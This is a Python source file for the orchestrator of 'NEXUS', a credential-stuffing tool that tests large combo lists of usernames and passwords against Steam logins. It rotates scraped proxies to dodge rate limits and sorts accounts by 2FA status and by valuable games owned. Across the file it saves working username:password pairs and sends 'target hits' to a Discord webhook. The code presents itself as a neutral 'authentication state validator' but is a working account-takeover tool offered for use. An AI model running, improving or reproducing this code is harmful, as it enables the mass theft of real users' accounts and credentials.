import sys
import os

if sys.platform == "win32":
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    if hasattr(sys.stderr, "reconfigure"):
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import time
import json
import signal
import asyncio
import argparse
from pathlib import Path
from typing import Optional, Dict, Any

# Ensure project root is in sys.path
BASE_DIR = Path(__file__).resolve().parent
if str(BASE_DIR) not in sys.path:
    sys.path.insert(0, str(BASE_DIR))

# Bulletproof DNS fallback resolution
from nexus.config import (
    install_resilient_dns, RESULTS_DIR, PROXIES_FILE, CHECKPOINT_FILE,
    DISCORD_WEBHOOK_URL, load_user_config
)
install_resilient_dns()

from nexus.core.validator import validate_credential_tuple, parse_credential_line, stream_credential_tuples
from nexus.core.proxy_pool import NetworkRelayPool, NetworkRelay, continuous_watchdog_loop
from nexus.core.proxy_scraper import scrape_fresh_proxies, filter_operational_proxies
from nexus.core.transport import SessionTransportPool
from nexus.utils.exporter import ResultExporter
from nexus.utils.discord import DiscordWebhookDispatcher
from nexus.utils.targets import evaluate_target_account


class HeadlessOrchestrator:
    """
    High-throughput asynchronous engine without graphical dependencies.
    Streamlines verification of massive (900k+) credential datasets.
    """

    def __init__(
        self,
        combo_path: Path,
        proxy_path: Optional[Path] = None,
        concurrency: int = 30,
        timeout: int = 12,
        max_retries: int = 2,
        webhook_url: Optional[str] = None,
        auto_scrape: bool = True,
        resume: bool = False
    ):
        self.combo_path = Path(combo_path)
        self.proxy_path = Path(proxy_path) if proxy_path else PROXIES_FILE
        self.concurrency = max(1, concurrency)
        self.timeout = timeout
        self.max_retries = max_retries
        self.auto_scrape = auto_scrape
        self.resume = resume

        self.webhook_url = (webhook_url or DISCORD_WEBHOOK_URL).strip()
        self.dispatcher = DiscordWebhookDispatcher(self.webhook_url) if self.webhook_url else None
        self.exporter = ResultExporter(RESULTS_DIR)
        self.relay_pool = NetworkRelayPool()
        self.transport_pool = SessionTransportPool(pool_limit=max(150, concurrency * 2))

        self._is_running = True
        self._watchdog_task: Optional[asyncio.Task] = None
        self._watchdog_stop_event = asyncio.Event()

        # Metrics
        self.total_lines = 0
        self.checked_count = 0
        self.target_hit_count = 0
        self.hit_count = 0
        self.two_fa_count = 0
        self.invalid_count = 0
        self.error_count = 0
        self.start_time = 0.0
        self.skip_to_index = 0

    def _load_checkpoint(self):
        """Recovers previous run state from checkpoint.json if resume flag is set."""
        if self.resume and CHECKPOINT_FILE.exists():
            try:
                with open(CHECKPOINT_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    self.skip_to_index = data.get("checked", 0)
                    self.target_hit_count = data.get("target_hits", 0)
                    self.hit_count = data.get("hits", 0)
                    self.two_fa_count = data.get("two_fa", 0)
                    print(f"\033[93m[CHECKPOINT RESUME] Resuming from record #{self.skip_to_index:,} | Target Hits: {self.target_hit_count} | All Paid: {self.hit_count}\033[0m")
            except Exception as e:
                print(f"[CHECKPOINT NOTICE] Could not load checkpoint: {e}")

    def _save_checkpoint(self):
        """Persists progress atomically to checkpoint.json."""
        try:
            RESULTS_DIR.mkdir(parents=True, exist_ok=True)
            data = {
                "checked": self.checked_count,
                "total": self.total_lines,
                "target_hits": self.target_hit_count,
                "hits": self.hit_count,
                "two_fa": self.two_fa_count,
                "timestamp": time.time()
            }
            tmp_file = CHECKPOINT_FILE.with_suffix(".tmp")
            with open(tmp_file, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
            tmp_file.replace(CHECKPOINT_FILE)
        except Exception:
            pass

    async def _init_proxies(self):
        """Loads existing proxies from disk or scrapes fresh ones if empty."""
        loaded = 0
        if self.proxy_path.exists():
            try:
                with open(self.proxy_path, "r", encoding="utf-8", errors="ignore") as f:
                    lines = [line.strip() for line in f if line.strip() and not line.startswith("#")]
                if lines:
                    loaded = self.relay_pool.load_from_lines(lines)
                    print(f"\033[96m[PROXY SHIELD] Loaded {loaded} relays from {self.proxy_path.name}.\033[0m")
            except Exception as e:
                print(f"[PROXY NOTICE] Read error: {e}")

        # If pool is empty or auto-scrape requested, perform initial harvest
        if loaded == 0 or (self.auto_scrape and loaded < 15):
            print("\033[93m[PROXY SHIELD] Harvesting fresh operational proxies across 60+ feeds...\033[0m")
            raw = await scrape_fresh_proxies(max_relays=3000)
            if raw:
                tested = await filter_operational_proxies(
                    raw,
                    concurrency=80,
                    timeout_sec=4,
                    save_to_file=True
                )
                self.relay_pool.append_relays(tested)
                print(f"\033[92m[PROXY SHIELD] Harvest complete: {len(tested)} verified live proxies ready.\033[0m")

    async def _replenish_relays(self):
        """Continuous auto-replenishment callback triggered by pool watchdog."""
        if not self._is_running:
            return
        try:
            print("\n\033[93m[PROXY SHIELD] Active nodes low. Re-scraping fresh proxy nodes in background...\033[0m")
            raw = await scrape_fresh_proxies(max_relays=2500)
            if raw:
                tested = await filter_operational_proxies(
                    raw,
                    concurrency=75,
                    timeout_sec=4,
                    save_to_file=True
                )
                if tested:
                    added = self.relay_pool.append_relays(tested)
                    print(f"\033[92m[PROXY SHIELD] Injected +{added} live proxies. Total Pool: {self.relay_pool.active_count}\033[0m")
        except Exception as e:
            print(f"[PROXY SHIELD NOTICE] Replenishment: {e}")

    def _render_telemetry(self):
        """Prints live real-time console status line."""
        elapsed = max(0.001, time.time() - self.start_time)
        cpm = int((self.checked_count / elapsed) * 60)
        active_relays = self.relay_pool.active_count if self.relay_pool else 0
        cooling_relays = self.relay_pool.cooling_count if self.relay_pool else 0
        total_str = f"{self.total_lines:,}" if self.total_lines > 0 else "Streaming"
        
        # ANSI Escape Codes for sleek terminal UI
        sys.stdout.write(
            f"\r\033[1;36m[NEXUS]\033[0m "
            f"Checked: \033[1;37m{self.checked_count:,}\033[0m/{total_str} | "
            f"🎯 Targets: \033[1;32m{self.target_hit_count:,}\033[0m | "
            f"Hits: \033[1;34m{self.hit_count:,}\033[0m | "
            f"2FA: \033[1;33m{self.two_fa_count:,}\033[0m | "
            f"Speed: \033[1;35m{cpm:,} CPM\033[0m | "
            f"Relays: \033[1;32m{active_relays} live\033[0m (\033[1;33m{cooling_relays} cooling\033[0m) | "
            f"Time: {int(elapsed)}s "
        )
        sys.stdout.flush()

    async def run(self):
        """Main orchestrator execution loop."""
        if not self.combo_path.exists():
            print(f"\033[91m[ERROR] Combos file not found: {self.combo_path}\033[0m")
            return

        self._load_checkpoint()
        self.start_time = time.time()

        # Initialize Proxy Subsystem
        await self._init_proxies()

        # Start Discord Dispatcher
        if self.dispatcher:
            print(f"\033[92m[DISCORD] Webhook notifications armed & active.\033[0m")
            await self.dispatcher.start()

        # Start Continuous Proxy Watchdog
        if self.relay_pool and self.relay_pool.total > 0:
            self._watchdog_task = asyncio.create_task(
                continuous_watchdog_loop(
                    pool=self.relay_pool,
                    stop_event=self._watchdog_stop_event,
                    interval_seconds=12,
                    on_pool_depleted_callback=self._replenish_relays
                )
            )

        # Bounded Queue (Memory-optimized for 900k+ accounts)
        queue: asyncio.Queue = asyncio.Queue(maxsize=max(2000, self.concurrency * 50))
        semaphore = asyncio.Semaphore(self.concurrency)

        async def _producer():
            """Streams accounts from file using intelligent generator."""
            line_idx = 0
            for user, pwd in stream_credential_tuples(self.combo_path):
                if not self._is_running:
                    break
                line_idx += 1
                if self.skip_to_index > 0 and line_idx <= self.skip_to_index:
                    continue

                await queue.put({
                    "index": line_idx,
                    "user": user,
                    "pass": pwd,
                    "retries": 0
                })
            self.total_lines = line_idx

        producer_task = asyncio.create_task(_producer())

        # Worker tasks
        workers = [
            asyncio.create_task(self._worker(queue, semaphore))
            for _ in range(self.concurrency)
        ]

        print("\n\033[1;32m═══════════════════════════════════════════════════════════════════\033[0m")
        print(f"\033[1;37m NEXUS CLOUD VALIDATOR RUNNING | Concurrency: {self.concurrency} | File: {self.combo_path.name}\033[0m")
        print("\033[1;32m═══════════════════════════════════════════════════════════════════\033[0m\n")

        # Monitor loop
        while self._is_running:
            if producer_task.done() and queue.empty():
                await queue.join()
                break
            self._render_telemetry()
            await asyncio.sleep(0.3)

        # Shutdown
        self._is_running = False
        producer_task.cancel()
        for w in workers:
            w.cancel()
        await asyncio.gather(*workers, return_exceptions=True)

        self._watchdog_stop_event.set()
        if self._watchdog_task:
            self._watchdog_task.cancel()
            try:
                await self._watchdog_task
            except asyncio.CancelledError:
                pass

        if self.dispatcher:
            await self.dispatcher.stop()

        await self.transport_pool.close_all()

        self._save_checkpoint()
        summary_path = self.exporter.finalize_validation_batch(
            total_checked=self.checked_count,
            total_hits=self.hit_count,
            target_hits=self.target_hit_count,
            two_fa_count=self.two_fa_count,
            invalid_count=self.invalid_count,
            elapsed_sec=time.time() - self.start_time
        )
        print("\n\n\033[1;32m═══════════════════════════════════════════════════════════════════\033[0m")
        print(f"\033[1;32m[COMPLETE] Validation finished. All accounts verified!\033[0m")
        print(f"Total Processed : {self.checked_count:,}")
        print(f"Target Hits     : {self.target_hit_count:,} (High-Value Wishlist Games)")
        print(f"All Paid Hits   : {self.hit_count:,}")
        print(f"Steam Guard 2FA : {self.two_fa_count:,}")
        print(f"Invalid Logins  : {self.invalid_count:,}")
        print(f"\033[1;36m[OUTPUT] Clean Hits File : hits.txt & results/hits.txt\033[0m")
        print(f"\033[1;36m[OUTPUT] User:Pass Combos: results/hits_combos_only.txt\033[0m")
        print(f"\033[1;36m[OUTPUT] Full Dossiers   : results/hits_detailed.txt\033[0m")
        print(f"\033[1;36m[OUTPUT] Summary Report  : {summary_path}\033[0m")
        print("\033[1;32m═══════════════════════════════════════════════════════════════════\033[0m\n")

    async def _worker(self, queue: asyncio.Queue, semaphore: asyncio.Semaphore):
        """Worker task executing individual account authentication handshakes with persistent connection pooling."""
        while self._is_running:
            try:
                task_data = await asyncio.wait_for(queue.get(), timeout=1.0)
            except asyncio.TimeoutError:
                if queue.empty():
                    break
                continue
            except asyncio.CancelledError:
                break

            username = task_data["user"]
            password = task_data["pass"]
            retries = task_data["retries"]

            async with semaphore:
                result = None
                max_tries = 8 if (self.relay_pool and self.relay_pool.total > 0) else 2

                for _ in range(max_tries):
                    if not self._is_running:
                        break

                    relay: Optional[NetworkRelay] = None
                    if self.relay_pool and self.relay_pool.total > 0:
                        relay = await self.relay_pool.get_next_relay()

                    if not relay:
                        await asyncio.sleep(0.8)

                    try:
                        session = await self.transport_pool.get_session(relay)
                        result = await validate_credential_tuple(
                            session=session,
                            username=username,
                            password=password,
                            relay=relay,
                            timeout=self.timeout
                        )
                    except Exception as err:
                        result = {"status": "ERROR", "details": str(err)}
                    finally:
                        if self.relay_pool and relay:
                            self.relay_pool.release_relay(relay)

                    status = result.get("status", "ERROR")
                    if relay:
                        if status == "RATE_LIMIT":
                            relay.mark_rate_limited(cooldown_seconds=180)
                            continue
                        elif status in ("PROXY_ERROR", "TIMEOUT", "ERROR"):
                            relay.mark_failure(severe=False)
                            continue

                    break

                if not result:
                    result = {
                        "account": f"{username}:{password}",
                        "username": username,
                        "password": password,
                        "status": "ERROR",
                        "total_games": 0,
                        "paid_games": 0,
                        "games": []
                    }

                status = result.get("status", "ERROR")

                # Requeue on inconclusive network failure
                if status in ("RATE_LIMIT", "ERROR", "TIMEOUT", "PROXY_ERROR") and retries < self.max_retries and self._is_running:
                    task_data["retries"] += 1
                    await queue.put(task_data)
                    queue.task_done()
                    continue

                if relay and status in ("HIT", "2FA_HIT", "INVALID"):
                    relay.mark_success(result.get("ping_ms", 100))

                self.checked_count += 1

                is_target, matched_targets = evaluate_target_account(result)
                if is_target:
                    result["matched_targets"] = matched_targets

                # Outcomes
                if status == "HIT":
                    self.hit_count += 1
                    self.exporter.record_item_live(result)

                    if is_target:
                        self.target_hit_count += 1
                        matched_names = ", ".join([tg.get("name", "") for tg in matched_targets[:3]])
                        if len(matched_targets) > 3:
                            matched_names += f" +{len(matched_targets)-3} more"
                        print(f"\n\033[1;32m[🎯 TARGET HIT] {username} | Matched: [{matched_names}] | Paid Games: {result.get('paid_games', 0)}\033[0m")
                        self.exporter.record_target_hit(result, matched_targets)
                        if self.dispatcher:
                            await self.dispatcher.dispatch_hit(result)
                    else:
                        print(f"\n\033[1;34m[PAID HIT] {username} | Paid Games: {result.get('paid_games', 0)} (No Wishlist Target)\033[0m")

                elif status == "2FA_HIT":
                    self.two_fa_count += 1
                    print(f"\n\033[1;33m[2FA GUARDED] {username} | Steam Guard Locked (Skipped from Discord)\033[0m")
                    self.exporter.record_item_live(result)

                elif status == "INVALID":
                    self.invalid_count += 1
                else:
                    self.error_count += 1

                # Checkpoint save
                if self.checked_count % 50 == 0:
                    self._save_checkpoint()

                queue.task_done()


def main():
    parser = argparse.ArgumentParser(description="NEXUS Platform Authentication State Validator - Headless Cloud Runner")
    parser.add_argument("-c", "--combos", default="combos.txt", help="Path to credentials file (.txt)")
    parser.add_argument("-p", "--proxies", default="proxies.txt", help="Path to custom proxies file")
    parser.add_argument("-t", "--threads", "--concurrency", dest="threads", type=int, default=30, help="Concurrency / Thread count")
    parser.add_argument("--timeout", type=int, default=12, help="HTTP timeout in seconds")
    parser.add_argument("--retries", type=int, default=2, help="Max retry count for rate-limited queries")
    parser.add_argument("-w", "--webhook", default=None, help="Discord Webhook URL for instant hit dispatch")
    parser.add_argument("--auto-scrape", action="store_true", default=True, help="Auto-scrape proxies continuously")
    parser.add_argument("--no-scrape", dest="auto_scrape", action="store_false", help="Disable proxy auto-scraping")
    parser.add_argument("--resume", action="store_true", default=False, help="Resume from last checkpoint.json")

    args = parser.parse_args()

    orchestrator = HeadlessOrchestrator(
        combo_path=Path(args.combos),
        proxy_path=Path(args.proxies),
        concurrency=args.threads,
        timeout=args.timeout,
        max_retries=args.retries,
        webhook_url=args.webhook,
        auto_scrape=args.auto_scrape,
        resume=args.resume
    )

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    def _sig_handler():
        print("\n\033[93m[SHUTDOWN] Terminating gracefully... Saving progress.\033[0m")
        orchestrator._is_running = False

    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, _sig_handler)
        except (NotImplementedError, AttributeError):
            # Windows signal handler fallback
            pass

    try:
        loop.run_until_complete(orchestrator.run())
    except KeyboardInterrupt:
        _sig_handler()
        loop.run_until_complete(asyncio.sleep(0.5))
    finally:
        loop.close()


if __name__ == "__main__":
    main()
